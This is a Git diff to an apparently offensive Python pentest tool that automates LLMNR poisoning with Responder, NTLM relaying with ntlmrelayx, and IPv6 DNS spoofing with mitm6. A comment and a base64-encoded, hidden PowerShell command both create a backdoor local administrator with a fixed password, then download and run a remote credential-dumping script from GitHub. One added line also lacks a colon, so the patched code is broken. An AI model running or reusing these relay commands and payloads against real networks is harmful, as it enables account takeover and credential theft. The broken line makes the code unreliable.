@@ -719,10 +719,9 @@ def start_responder_llmnr():
     print('[*] Responder-Session.log:')
     return resp_proc
 
-def run_relay_attack(domains):
+def run_relay_attack():
     '''
     Start ntlmrelayx for ntlm relaying
-    We don't need the var domains yet, but maybe in future
     '''
     iface = get_iface()
     edit_responder_conf('Off', ['HTTP', 'SMB'])
@@ -731,7 +730,7 @@ def run_relay_attack(domains):
 
 # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
     relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt wa 3'
+                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3'
                 ' -c "powershell -nop -exec bypass -w hidden -enc '
                 'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
@@ -887,7 +886,8 @@ def cleanup_mitm6(mitm6_proc):
     '''
     pid = mitm6_proc.pid
     os.kill(pid, signal.SIGINT)
-    if not pid.poll():
+    print(mitm6_proc.poll())
+    if not mitm6_proc.poll()
         print('[*] Waiting on mitm6 to cleanly shut down...')
 
 def get_user_from_ntlm_hash(ntlm_hash):
@@ -960,14 +960,14 @@ def run_ipv6_dns_poison():
 
     return mitm6_proc
 
-def do_ntlmrelay(prev_creds, args, domains):
+def do_ntlmrelay(prev_creds, args):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
     mitm6_proc = None
 
     print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
-    resp_proc, ntlmrelay_proc = run_relay_attack(domains)
+    resp_proc, ntlmrelay_proc = run_relay_attack()
 
     if 'dns' not in args.skip:
         print('\n[*] Attack 5: IPv6 DNS Poison')
@@ -1136,7 +1136,7 @@ def main(report, args):
     # ATTACK 4: NTLM relay
     # ATTACK 5: IPv6 DNS WPAD spoof
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
-        do_ntlmrelay(prev_creds, args, domains)
+        do_ntlmrelay(prev_creds, args)
 
 if __name__ == "__main__":
     args = parse_args()
